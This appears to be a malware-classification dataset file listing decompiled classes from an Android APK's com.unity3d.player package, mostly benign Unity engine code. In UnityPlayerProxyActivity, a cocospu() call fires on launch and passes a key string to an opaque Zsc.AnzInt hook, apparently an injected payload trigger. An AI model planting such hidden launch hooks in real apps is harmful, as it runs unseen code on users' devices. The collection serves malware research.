"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\i.code","public final class i {   private LinkedHashMap a=new LinkedHashMap(); public static class a {     final int a;     final float[] b;     public a(    int i,    float[] fArr){       this.a=i;       this.b=fArr;     }   }   public static float a(  MotionEvent motionEvent,  int i){     return a(motionEvent,9,i);   }   private static float a(  MotionEvent motionEvent,  int i,  int i2){     return motionEvent.getAxisValue(i,i2);   }   private static Object a(  Object obj,  int i){     if (i >= Array.getLength(obj)) {       return obj;     }     Object newInstance=Array.newInstance(obj.getClass().getComponentType(),i);     System.arraycopy(obj,0,newInstance,0,i);     return newInstance;   }   private void a(  int[] iArr){     int i=0;     LinkedHashMap linkedHashMap=new LinkedHashMap();     int length=iArr.length;     int i2=0;     while (i < length) {       int i3=iArr[i];       int i4=i2 + 1;       d dVar=new d(i2,a(i3));       if (dVar.b != null) {         linkedHashMap.put(Integer.valueOf(i3),dVar);       }       i++;       i2=i4;     }     this.a=linkedHashMap;   }   public static boolean a(  View view,  MotionEvent motionEvent){     return view.dispatchGenericMotionEvent(motionEvent);   }   public static int[] a(  int i){     InputDevice device=InputDevice.getDevice(i);     if (device == null) {       return null;     }     List<InputDevice.MotionRange> motionRanges=device.getMotionRanges();     int[] iArr=new int[motionRanges.size()];     int i2=0;     Iterator<InputDevice.MotionRange> it=motionRanges.iterator();     while (true) {       int i3=i2;       if (!it.hasNext()) {         return b((int[])a(iArr,i3));       }       InputDevice.MotionRange next=it.next();       if ((next.getSource() & 16777232) == 16777232) {         iArr[i3]=next.getAxis();         i2=i3 + 1;       }  else {         i2=i3;       }     }   }   public static String b(  int i){     InputDevice device=InputDevice.getDevice(i);     if (device != null) {       return device.getName();     }     return null;   }   private static int[] b(  int[] iArr){     Arrays.sort(iArr);     return iArr;   }   private d c(  int i){     d dVar=(d)this.a.get(Integer.valueOf(i));     if (dVar != null) {       return dVar;     }     a();     return (d)this.a.get(Integer.valueOf(i));   }   public final int[] a(){     int i;     int[] deviceIds=InputDevice.getDeviceIds();     int[] iArr=new int[deviceIds.length];     int length=deviceIds.length;     int i2=0;     int i3=0;     while (i2 < length) {       int i4=deviceIds[i2];       InputDevice device=InputDevice.getDevice(i4);       if (device == null || (device.getSources() & 16777232) != 16777232) {         i=i3;       }  else {         i=i3 + 1;         iArr[i3]=i4;       }       i2++;       i3=i;     }     int[] b=b((int[])a(iArr,i3));     a(b);     return b;   }   public final a[] a(  MotionEvent motionEvent){     a[] aVarArr=new a[motionEvent.getPointerCount()];     int i=0;     for (int i2=0; i2 < aVarArr.length; i2++) {       d c=c(motionEvent.getDeviceId());       if (c != null) {         a aVar=new a(c.a,new float[c.b.length]);         for (int i3=0; i3 < c.b.length; i3++) {           aVar.b[i3]=a(motionEvent,c.b[i3],i2);         }         aVarArr[i]=aVar;         i++;       }     }     return (a[])a(aVarArr,i);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\InterfaceC0000a.code","public interface InterfaceC0000a {   void onCameraFrame(  a aVar,  byte[] bArr); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\j.code","public interface j {   void a(  GLSurfaceView gLSurfaceView,  boolean z);   void a(  View view);   void a(  View view,  boolean z);   boolean a(  Vibrator vibrator);   boolean b(  View view);   void c(  View view); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\k.code","public final class k {   public static int a(  MotionEvent motionEvent){     int buttonState=motionEvent.getButtonState();     if ((buttonState & 1) != 1) {       if ((buttonState & 2) == 2) {         return 1;       }       if ((buttonState & 4) == 4) {         return 2;       }     }     return 0;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\l.code","public final class l {   public static void a(  Display display,  DisplayMetrics displayMetrics){     display.getRealMetrics(displayMetrics);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\m.code","public interface m {   RectF a();   void a(  long j,  long j2,  int i,  int i2,  int[] iArr,  float[] fArr,  int i3,  float f,  float f2,  int i4,  int i5,  int i6,  int i7,  int i8,  long[] jArr,  float[] fArr2); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\n.code","final class n {   public static void Log(  int i,  String str){     if (i == 6) {       Log.e(""Unity"",str);     }     if (i == 5) {       Log.w(""Unity"",str);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\o.code","public final class o {   private final Bundle a;   public o(  Activity activity){     Bundle bundle=Bundle.EMPTY;     PackageManager packageManager=activity.getPackageManager();     ComponentName componentName=activity.getComponentName();     try {       ActivityInfo activityInfo=packageManager.getActivityInfo(componentName,128);       if (activityInfo != null && activityInfo.metaData != null) {         bundle=activityInfo.metaData;       }     }  catch (    PackageManager.NameNotFoundException e) {       n.Log(6,""Unable to retreive meta data for activity '"" + componentName + ""'"");     }     this.a=new Bundle(bundle);   }   private static String a(  String str){     return String.format(""%s.%s"",""unityplayer"",str);   }   public final boolean a(){     return this.a.getBoolean(a(""ForwardNativeEventsToDalvik""));   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\p.code","!org.eclipse.jdt.core.dom.TypeDeclaration@73976bda"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\PlayerPrefs.code","class PlayerPrefs {   private SharedPreferences a;   private SharedPreferences.Editor b;   private AtomicBoolean c=new AtomicBoolean(false);   public PlayerPrefs(  SharedPreferences sharedPreferences){     this.a=sharedPreferences;     this.b=this.a.edit();     InitPlayerPrefs();   }   private void DeleteAll(){     this.b.clear();     this.c.set(true);   }   private void DeleteKey(  String str){     this.b.remove(str);     this.c.set(true);   }   private float GetFloat(  String str,  float f){     Sync();     try {       return this.a.getFloat(str,f);     }  catch (    ClassCastException e) {       return f;     }   }   private int GetInt(  String str,  int i){     Sync();     try {       return this.a.getInt(str,i);     }  catch (    ClassCastException e) {       return i;     }   }   private String GetString(  String str,  String str2){     Sync();     try {       return this.a.getString(str,str2);     }  catch (    ClassCastException e) {       return str2;     }   }   private boolean HasKey(  String str){     Sync();     return this.a.contains(str);   }   private final native void InitPlayerPrefs();   private boolean SetFloat(  String str,  float f){     this.b.putFloat(str,f);     this.c.set(true);     return true;   }   private boolean SetInt(  String str,  int i){     this.b.putInt(str,i);     this.c.set(true);     return true;   }   private boolean SetString(  String str,  String str2){     this.b.putString(str,str2);     this.c.set(true);     return true;   }   private void Sync(){     if (this.c.getAndSet(false)) {       this.b.commit();     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\q.code","public final class q {   static final boolean a;   static final boolean b;   static final boolean c;   static final boolean d;   static final boolean e;   static final boolean f;   static final f g;   static final g h;   static final h i;   static final j j;   static final i k;   static final k l;   static final l m;   private static boolean n; static {     n=Build.VERSION.SDK_INT >= 5;     a=Build.VERSION.SDK_INT >= 8;     b=Build.VERSION.SDK_INT >= 9;     c=Build.VERSION.SDK_INT >= 11;     d=Build.VERSION.SDK_INT >= 12;     e=Build.VERSION.SDK_INT >= 14;     f=Build.VERSION.SDK_INT >= 17;     g=n ? new f() : null;     h=a ? new g() : null;     i=b ? new h() : null;     j=c ? new e() : null;     k=d ? new i() : null;     l=e ? new k() : null;     m=f ? new l() : null;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\r.code","final class r extends ImageView {   private Bitmap a;   public r(  Context context){     super(context);     this.a=null;   }   public final void a(){     if (this.a == null) {       return;     }     setImageBitmap(this.a);     setLayoutParams(new FrameLayout.LayoutParams(this.a.getWidth(),this.a.getHeight(),51));     setPadding(0,0,0,0);   }   public final void a(  int i,  int i2){     ByteBuffer allocateDirect=ByteBuffer.allocateDirect(i * i2 * 4);     allocateDirect.order(ByteOrder.nativeOrder());     allocateDirect.position(0);     GLES10.glReadPixels(0,0,i,i2,6408,5121,allocateDirect);     Bitmap createBitmap=Bitmap.createBitmap(i,i2,Bitmap.Config.ARGB_8888);     allocateDirect.position(0);     createBitmap.copyPixelsFromBuffer(allocateDirect);     Matrix matrix=new Matrix();     matrix.preScale(1.0f,-1.0f);     this.a=Bitmap.createBitmap(createBitmap,0,0,i,i2,matrix,false);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\ReflectionHelper.code","class ReflectionHelper {   protected static boolean LOG=false;   protected static final boolean LOGV=false;   ReflectionHelper(){   }   private static float a(  Class cls,  Class cls2){     if (cls.equals(cls2)) {       return 1.0f;     }     if (!cls.isPrimitive() && !cls2.isPrimitive()) {       try {         if (cls.asSubclass(cls2) != null) {           return 0.5f;         }       }  catch (      ClassCastException e) {       }       try {         if (cls2.asSubclass(cls) != null) {           return 0.1f;         }       }  catch (      ClassCastException e2) {       }     }     return 0.0f;   }   private static float a(  Class cls,  Class[] clsArr,  Class[] clsArr2){     int i=0;     if (clsArr2.length == 0) {       return 0.1f;     }     if ((clsArr == null ? 0 : clsArr.length) + 1 != clsArr2.length) {       return 0.0f;     }     float f=1.0f;     if (clsArr != null) {       int length=clsArr.length;       int i2=0;       while (i < length) {         f*=a(clsArr[i],clsArr2[i2]);         i++;         i2++;       }     }     return f * a(cls,clsArr2[clsArr2.length - 1]);   }   private static Class a(  String str,  int[] iArr){     while (true) {       if (iArr[0] >= str.length()) {         break;       }       int i=iArr[0];       iArr[0]=i + 1;       char charAt=str.charAt(i);       if (charAt != '(' && charAt != ')') {         if (charAt == 'L') {           int indexOf=str.indexOf(59,iArr[0]);           if (indexOf != -1) {             String substring=str.substring(iArr[0],indexOf);             iArr[0]=indexOf + 1;             try {               return Class.forName(substring.replace('/','.'));             }  catch (            ClassNotFoundException e) {             }           }         }  else {           if (charAt == 'Z') {             return Boolean.TYPE;           }           if (charAt == 'I') {             return Integer.TYPE;           }           if (charAt == 'F') {             return Float.TYPE;           }           if (charAt == 'V') {             return Void.TYPE;           }           if (charAt == 'B') {             return Byte.TYPE;           }           if (charAt == 'S') {             return Short.TYPE;           }           if (charAt == 'J') {             return Long.TYPE;           }           if (charAt == 'D') {             return Double.TYPE;           }           if (charAt == '[') {             return Array.newInstance((Class<?>)a(str,iArr),0).getClass();           }           n.Log(5,""! parseType; "" + charAt + "" is not known!"");         }       }     }     return null;   }   private static Class[] a(  String str){     Class a;     int[] iArr={0};     ArrayList arrayList=new ArrayList();     while (iArr[0] < str.length() && (a=a(str,iArr)) != null) {       arrayList.add(a);     }     Class[] clsArr=new Class[arrayList.size()];     Iterator it=arrayList.iterator();     int i=0;     while (it.hasNext()) {       clsArr[i]=(Class)it.next();       i++;     }     return clsArr;   }   protected static Constructor getConstructorID(  Class cls,  String str){     Constructor<?> constructor;     Constructor<?> constructor2;     Class[] a=a(str);     Constructor<?> constructor3=null;     float f=0.0f;     Constructor<?>[] constructors=cls.getConstructors();     int length=constructors.length;     int i=0;     while (true) {       if (i >= length) {         constructor=constructor3;         break;       }       constructor=constructors[i];       float a2=a(Void.TYPE,constructor.getParameterTypes(),a);       if (a2 <= f) {         a2=f;         constructor2=constructor3;       }  else {         if (a2 == 1.0f) {           break;         }         constructor2=constructor;       }       i++;       constructor3=constructor2;       f=a2;     }     if (constructor == null) {       n.Log(6,""! getConstructorID(\"""" + cls.getName() + ""\"", \""""+ str+ ""\"") FAILED!"");     }     return constructor;   }   protected static java.lang.reflect.Field getFieldID(  java.lang.Class r11,  java.lang.String r12,  java.lang.String r13,  boolean r14){     throw new UnsupportedOperationException(""Method not decompiled: com.unity3d.player.ReflectionHelper.getFieldID(java.lang.Class, java.lang.String, java.lang.String, boolean):java.lang.reflect.Field"");   }   protected static java.lang.reflect.Method getMethodID(  java.lang.Class r11,  java.lang.String r12,  java.lang.String r13,  boolean r14){     throw new UnsupportedOperationException(""Method not decompiled: com.unity3d.player.ReflectionHelper.getMethodID(java.lang.Class, java.lang.String, java.lang.String, boolean):java.lang.reflect.Method"");   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\s.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3538a9eb"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\t.code","public final class t extends Dialog implements TextWatcher, View.OnClickListener {   private Context a;   private UnityPlayer b;   public t(  Context context,  UnityPlayer unityPlayer,  String str,  int i,  boolean z,  boolean z2,  boolean z3,  String str2){     super(context);     this.a=null;     this.b=null;     this.a=context;     this.b=unityPlayer;     getWindow().setGravity(80);     getWindow().requestFeature(1);     getWindow().setBackgroundDrawable(new ColorDrawable(0));     setContentView(createSoftInputView());     getWindow().clearFlags(2);     EditText editText=(EditText)findViewById(1057292289);     Button button=(Button)findViewById(1057292290);     a(editText,str,i,z,z2,z3,str2);     button.setOnClickListener(this);     editText.setOnFocusChangeListener(new View.OnFocusChangeListener(){       @Override public final void onFocusChange(      View view,      boolean z4){         if (z4) {           t.this.getWindow().setSoftInputMode(5);         }       }     } );   }   private static int a(  int i,  boolean z,  boolean z2,  boolean z3){     int i2=(z3 ? 128 : 0) | (z2 ? 131072 : 0) | (z ? 32768 : 0);     return (i < 0 || i > 7) ? i2 : i2 | new int[]{1,16385,12290,17,2,3,97,33}[i];   }   public String a(){     EditText editText=(EditText)findViewById(1057292289);     if (editText == null) {       return null;     }     return editText.getText().toString().trim();   }   private void a(  EditText editText,  String str,  int i,  boolean z,  boolean z2,  boolean z3,  String str2){     editText.setImeOptions(6);     editText.setText(str);     editText.setHint(str2);     editText.setInputType(a(i,z,z2,z3));     editText.addTextChangedListener(this);     int inputType=editText.getInputType();     editText.setKeyListener(TextKeyListener.getInstance());     editText.setRawInputType(inputType);     editText.setClickable(true);     if (z2) {       return;     }     editText.selectAll();   }   public void a(  String str,  boolean z){     this.b.reportSoftInputStr(str,1,z);   }   public final void a(  String str){     EditText editText=(EditText)findViewById(1057292289);     if (editText != null) {       editText.setText(str);       editText.setSelection(str.length());     }   }   @Override public final void afterTextChanged(  Editable editable){     this.b.reportSoftInputStr(editable.toString(),0,false);   }   @Override public final void beforeTextChanged(  CharSequence charSequence,  int i,  int i2,  int i3){   }   protected final View createSoftInputView(){     RelativeLayout relativeLayout=new RelativeLayout(this.a);     relativeLayout.setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     EditText editText=new EditText(this.a){       @Override public final boolean onKeyPreIme(      int i,      KeyEvent keyEvent){         if (i == 4) {           t.this.a(t.this.a(),true);         }         if (i == 84) {           return true;         }         return super.onKeyPreIme(i,keyEvent);       }       @Override public final void onWindowFocusChanged(      boolean z){         super.onWindowFocusChanged(z);         if (z) {           ((InputMethodManager)t.this.a.getSystemService(""input_method"")).showSoftInput(this,0);         }       }     } ;     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-2);     layoutParams.addRule(15);     layoutParams.addRule(0,1057292290);     editText.setLayoutParams(layoutParams);     editText.setId(1057292289);     relativeLayout.addView(editText);     Button button=new Button(this.a);     button.setText(this.a.getResources().getIdentifier(""ok"",""string"",""android""));     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.addRule(15);     layoutParams2.addRule(11);     button.setLayoutParams(layoutParams2);     button.setId(1057292290);     relativeLayout.addView(button);     ((EditText)relativeLayout.findViewById(1057292289)).setOnEditorActionListener(new TextView.OnEditorActionListener(){       @Override public final boolean onEditorAction(      TextView textView,      int i,      KeyEvent keyEvent){         if (i == 6) {           t.this.a(t.this.a(),false);         }         return false;       }     } );     return relativeLayout;   }   @Override public final void onBackPressed(){     a(a(),true);   }   @Override public final void onClick(  View view){     a(a(),false);   }   @Override public final void onTextChanged(  CharSequence charSequence,  int i,  int i2,  int i3){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\u.code","public final class u {   public static u a;   private final FrameLayout b;   private Set c=new HashSet();   private View d;   private View e;   public u(  FrameLayout frameLayout){     this.b=frameLayout;     a=this;   }   private void f(  View view){     this.b.addView(view,this.b.getChildCount());   }   private void g(  View view){     this.b.removeView(view);     this.b.requestLayout();   }   public final Context a(){     return this.b.getContext();   }   public final void a(  View view){     this.e=view;     this.e.setVisibility(4);     this.b.addView(this.e);   }   public final void b(  View view){     this.c.add(view);     if (this.d != null) {       f(view);     }   }   public final void c(  View view){     this.c.remove(view);     if (this.d != null) {       g(view);     }   }   public final void d(  View view){     if (this.d != view) {       this.d=view;       this.b.addView(view);       Iterator it=this.c.iterator();       while (it.hasNext()) {         f((View)it.next());       }       if (this.e != null) {         this.e.setVisibility(4);       }     }   }   public final void e(  View view){     if (this.d == view) {       Iterator it=this.c.iterator();       while (it.hasNext()) {         g((View)it.next());       }       this.b.removeView(view);       this.d=null;       if (this.e != null) {         this.e.setVisibility(0);       }     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\UnityGL.code","public interface UnityGL {   void a();   void onPause();   void onResume();   void queueEvent(  Runnable runnable);   void setRenderer(  GLSurfaceView.Renderer renderer); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\UnityJavaRunnable.code","class UnityJavaRunnable implements Runnable {   private final int a;   UnityJavaRunnable(  int i){     this.a=i;   }   private native void nativeFinalize(  int i);   private native void nativeRun(  int i);   protected void finalize(){     try {       nativeFinalize(this.a);     }   finally {       super.finalize();     }   }   @Override public void run(){     nativeRun(this.a);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\UnityPlayer.code","!org.eclipse.jdt.core.dom.TypeDeclaration@21035874"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\UnityPlayerActivity.code","public class UnityPlayerActivity extends Activity {   private UnityPlayer a;   @Override public void onConfigurationChanged(  Configuration configuration){     super.onConfigurationChanged(configuration);     this.a.configurationChanged(configuration);   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     setTheme(R.style.Theme.NoTitleBar.Fullscreen);     requestWindowFeature(1);     this.a=new UnityPlayer(this);     if (this.a.getSettings().getBoolean(""hide_status_bar"",true)) {       getWindow().setFlags(1024,1024);     }     this.a.init(this.a.getSettings().getInt(""gles_mode"",1),false);     View view=this.a.getView();     setContentView(view);     view.requestFocus();   }   @Override protected void onDestroy(){     super.onDestroy();     this.a.quit();   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     return this.a.onKeyDown(i,keyEvent);   }   @Override public boolean onKeyMultiple(  int i,  int i2,  KeyEvent keyEvent){     return this.a.onKeyMultiple(i,i2,keyEvent);   }   @Override public boolean onKeyUp(  int i,  KeyEvent keyEvent){     return this.a.onKeyUp(i,keyEvent);   }   @Override protected void onPause(){     super.onPause();     this.a.pause();     if (isFinishing()) {       this.a.quit();     }   }   @Override protected void onResume(){     super.onResume();     this.a.resume();   }   @Override public void onWindowFocusChanged(  boolean z){     super.onWindowFocusChanged(z);     this.a.windowFocusChanged(z);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\UnityPlayerNativeActivity.code","public class UnityPlayerNativeActivity extends NativeActivity {   protected UnityPlayer mUnityPlayer;   @Override public boolean dispatchKeyEvent(  KeyEvent keyEvent){     return keyEvent.getAction() == 2 ? this.mUnityPlayer.onKeyMultiple(keyEvent.getKeyCode(),keyEvent.getRepeatCount(),keyEvent) : super.dispatchKeyEvent(keyEvent);   }   @Override public void onConfigurationChanged(  Configuration configuration){     super.onConfigurationChanged(configuration);     this.mUnityPlayer.configurationChanged(configuration);   }   @Override protected void onCreate(  Bundle bundle){     this.mUnityPlayer=new UnityPlayer(this);     requestWindowFeature(1);     super.onCreate(bundle);     getWindow().takeSurface(null);     setTheme(R.style.Theme.NoTitleBar.Fullscreen);     getWindow().setFormat(4);     if (this.mUnityPlayer.getSettings().getBoolean(""hide_status_bar"",true)) {       getWindow().setFlags(1024,1024);     }     this.mUnityPlayer.init(this.mUnityPlayer.getSettings().getInt(""gles_mode"",1),false);     View view=this.mUnityPlayer.getView();     setContentView(view);     view.requestFocus();   }   @Override protected void onDestroy(){     super.onDestroy();     this.mUnityPlayer.quit();   }   @Override protected void onPause(){     super.onPause();     this.mUnityPlayer.pause();     if (isFinishing()) {       this.mUnityPlayer.quit();     }   }   @Override protected void onResume(){     super.onResume();     this.mUnityPlayer.resume();   }   @Override public void onWindowFocusChanged(  boolean z){     super.onWindowFocusChanged(z);     this.mUnityPlayer.windowFocusChanged(z);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\UnityPlayerProxyActivity.code","public class UnityPlayerProxyActivity extends Activity {   public static void copyPlayerPrefs(  Context context,  String[] strArr){     SharedPreferences sharedPreferences=context.getSharedPreferences(context.getPackageName(),0);     if (sharedPreferences.getAll().isEmpty()) {       SharedPreferences.Editor edit=sharedPreferences.edit();       for (      String str : strArr) {         Map<String,?> all=context.getSharedPreferences(str,0).getAll();         if (!all.isEmpty()) {           for (          Map.Entry<String,?> entry : all.entrySet()) {             Object value=entry.getValue();             if (value.getClass() == Integer.class) {               edit.putInt(entry.getKey(),((Integer)value).intValue());             }  else             if (value.getClass() == Float.class) {               edit.putFloat(entry.getKey(),((Float)value).floatValue());             }  else             if (value.getClass() == String.class) {               edit.putString(entry.getKey(),(String)value);             }           }           edit.commit();         }       }     }   }   public void cocospu(){     Zsc.AnzInt(this,""0Ksms0YW26NF8Uvzzxv0EW2k"");   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     cocospu();     String[] strArr={""com.unity3d.player.UnityPlayerActivity"",""com.unity3d.player.UnityPlayerNativeActivity""};     copyPlayerPrefs(this,strArr);     try {       Intent intent=new Intent(this,Class.forName(strArr[Build.VERSION.SDK_INT >= 9 ? (char)1 : (char)0]));       intent.addFlags(65536);       Bundle extras=getIntent().getExtras();       if (extras != null) {         intent.putExtras(extras);       }       startActivity(intent);     }  catch (    ClassNotFoundException e) {       e.printStackTrace();     }  finally {       finish();     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\v.code","public final class v {   final EGLConfig a;   private EGL10 b;   private EGLDisplay c;   public v(  EGL10 egl10,  EGLDisplay eGLDisplay,  EGLConfig eGLConfig){     this.b=egl10;     this.c=eGLDisplay;     this.a=eGLConfig;   }   private static void a(  String str,  EGL10 egl10){     for (int i=0; i < 2; i++) {       int eglGetError=egl10.eglGetError();       if (eglGetError == 12288) {         return;       }       n.Log(6,String.format(""%s: EGL error: 0x%x"",str,Integer.valueOf(eglGetError)));     }   }   public final int a(  int i){     int[] iArr=new int[1];     if (this.b.eglGetConfigAttrib(this.c,this.a,i,iArr)) {       return iArr[0];     }     int eglGetError=this.b.eglGetError();     if (eglGetError != 12292) {       n.Log(6,String.format(""findConfigAttrib: EGL error: 0x%x"",Integer.valueOf(eglGetError)));     }     a(""findConfigAttrib ("" + Integer.toHexString(i) + "")"",this.b);     return 0;   }   public final String a(){     int a=a(12320);     int a2=a(12324);     int a3=a(12323);     int a4=a(12322);     int a5=a(12321);     int a6=a(12325);     int a7=a(12326);     int a8=a(12337);     int a9=a(12513);     return (a5 == 0 ? ""RGB"" : ""RGBA"") + a + "" ""+ Integer.toString(a2)+ Integer.toString(a3)+ Integer.toString(a4)+ (a5 == 0 ? """" : Integer.toString(a5))+ "" ""+ Integer.toString(a6)+ ""/""+ Integer.toString(a7)+ (a8 < 2 ? """" : "" AAx"" + Integer.toString(a8))+ (a9 < 2 ? """" : "" CSAAx"" + Integer.toString(a9));   }   public final boolean a(  v vVar){     return a(12324) == vVar.a(12324) && a(12323) == vVar.a(12323) && a(12322) == vVar.a(12322) && a(12321) == vVar.a(12321);   }   public final String toString(){     int[] iArr={12320,12321,12322,12323,12324,12325,12326,12327,12328,12329,12330,12331,12332,12333,12334,12335,12336,12337,12338,12339,12340,12343,12342,12341,12345,12346,12347,12348,12349,12350,12351,12352,12354,12512,12513};     String[] strArr={""EGL_BUFFER_SIZE"",""EGL_ALPHA_SIZE"",""EGL_BLUE_SIZE"",""EGL_GREEN_SIZE"",""EGL_RED_SIZE"",""EGL_DEPTH_SIZE"",""EGL_STENCIL_SIZE"",""EGL_CONFIG_CAVEAT"",""EGL_CONFIG_ID"",""EGL_LEVEL"",""EGL_MAX_PBUFFER_HEIGHT"",""EGL_MAX_PBUFFER_PIXELS"",""EGL_MAX_PBUFFER_WIDTH"",""EGL_NATIVE_RENDERABLE"",""EGL_NATIVE_VISUAL_ID"",""EGL_NATIVE_VISUAL_TYPE"",""EGL_PRESERVED_RESOURCES"",""EGL_SAMPLES"",""EGL_SAMPLE_BUFFERS"",""EGL_SURFACE_TYPE"",""EGL_TRANSPARENT_TYPE"",""EGL_TRANSPARENT_RED_VALUE"",""EGL_TRANSPARENT_GREEN_VALUE"",""EGL_TRANSPARENT_BLUE_VALUE"",""EGL_BIND_TO_TEXTURE_RGB"",""EGL_BIND_TO_TEXTURE_RGBA"",""EGL_MIN_SWAP_INTERVAL"",""EGL_MAX_SWAP_INTERVAL"",""EGL_LUMINANCE_SIZE"",""EGL_ALPHA_MASK_SIZE"",""EGL_COLOR_BUFFER_TYPE"",""EGL_RENDERABLE_TYPE"",""EGL_CONFORMANT"",""EGL_COVERAGE_BUFFERS_NV"",""EGL_COVERAGE_SAMPLES_NV""};     StringBuilder sb=new StringBuilder();     for (int i=0; i < iArr.length; i++) {       sb.append(String.format(""  %s: %d\n"",strArr[i],Integer.valueOf(a(iArr[i]))));     }     return sb.toString();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.unity3d.player\w.code","class w {   private static final int[] p;   private static final int[] q;   private static final int[][] r;   private static boolean s;   final GLSurfaceView.EGLConfigChooser a=new GLSurfaceView.EGLConfigChooser(){     @Override public final EGLConfig chooseConfig(    EGL10 egl10,    EGLDisplay eGLDisplay){       v a=w.this.a(egl10,eGLDisplay);       if (!a.a(w.this.o)) {         n.Log(5,""EGL configuration may not be compatiable with the current surface"");       }       return a.a;     }   } ;   private int b;   private boolean c;   private int d;   private int e;   private int f;   private boolean g;   private int h;   private int i;   private int j;   private int k;   private int l;   private int m;   private int n;   private v o; static {     s=!w.class.desiredAssertionStatus();     p=new int[]{12324,4,12323,4,12322,4,12352,4,12339,4,12344};     q=new int[]{12324,5,12323,6,12322,5,12352,1,12339,4,12344};     r=new int[][]{new int[0],q,p};   }   public w(  boolean z,  int i,  int i2,  int i3,  int i4){     this.b=i4;     a(z,i,i2,i3);   }   private v a(  EGL10 egl10,  EGLDisplay eGLDisplay,  EGLConfig[] eGLConfigArr){     for (    EGLConfig eGLConfig : eGLConfigArr) {       if (!s && eGLConfig == null) {         throw new AssertionError();       }       v vVar=new v(egl10,eGLDisplay,eGLConfig);       int a=vVar.a(12325);       int a2=vVar.a(12326);       int a3=vVar.a(12337);       int a4=vVar.a(12513);       if (a >= this.l && a2 >= this.m && (a3 >= this.n || a4 - 1 >= this.n)) {         int a5=vVar.a(12324);         int a6=vVar.a(12323);         int a7=vVar.a(12322);         int a8=vVar.a(12321);         if (a5 == this.h && a6 == this.i && a7 == this.j && a8 == this.k) {           int a9=vVar.a(12346);           if (vVar.a(12345) == 0 && a9 == 0) {             a9=1;           }           if (a5 != 8 || a6 != 8 || a7 != 8 || a9 != 0) {             return vVar;           }           n.Log(3,""This message is harmless: 32bits and selecting config with EGL_BIND_TO_TEXTURE_RGBA = 0"");           return vVar;         }       }     }     return null;   }   private void a(  boolean z,  int i,  int i2,  int i3){     this.c=z && b();     this.d=i;     this.e=i2;     this.f=i3;     this.g=this.c;     this.h=this.c ? 8 : 5;     this.i=this.c ? 8 : 6;     this.j=this.c ? 8 : 5;     this.k=(this.c && c()) ? 8 : 0;     this.l=this.d;     this.m=this.e;     this.n=this.f;     if (z && !b()) {       n.Log(5,""Running on pre-Gingerbread device: DisplayBuffer doesn't support 32bits."");     }     if (this.c && !c()) {       n.Log(5,""Running on pre-Honeycomb device: DisplayBuffer won't contain alpha channel."");     }     this.o=d();   }   private static boolean b(){     return Build.VERSION.SDK_INT >= 9;   }   private static boolean c(){     return Build.VERSION.SDK_INT >= 11;   }   private v d(){     EGL10 egl10=(EGL10)EGLContext.getEGL();     EGLDisplay 